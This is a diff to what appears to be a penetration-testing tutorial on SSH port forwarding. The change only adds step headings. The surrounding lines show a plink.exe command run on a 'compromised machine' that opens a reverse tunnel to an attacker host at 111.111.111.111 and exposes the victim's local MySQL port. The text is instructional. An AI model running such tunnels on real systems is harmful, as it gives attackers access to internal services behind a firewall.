@@ -109,12 +109,14 @@ ssh <gateway> -R <remote port to bind>:<local host>:<local port>
 
 By the way, plink is a ssh-client for windows that can be run from the terminal. The ip of the attacking machine is **111.111.111.111**.
 
+**Step 1**
 So on our compromised machine we do:
 
 ```
 plink.exe -l root -pw mysecretpassword 111.111.111.111 -R 3307:127.0.0.1:3306
 ```
 
+**Step 2**
 Now we can check netstat on our attacking machine, we should see something like this:
 
 ```
@@ -122,6 +124,7 @@ tcp        0      0 127.0.0.1:3307          0.0.0.0:*               LISTEN      
 ```
 That means what we can connect to that port on the attacking machine from the attacking machine.
 
+**Step 3**
 Connect using the following command:
 
 ```
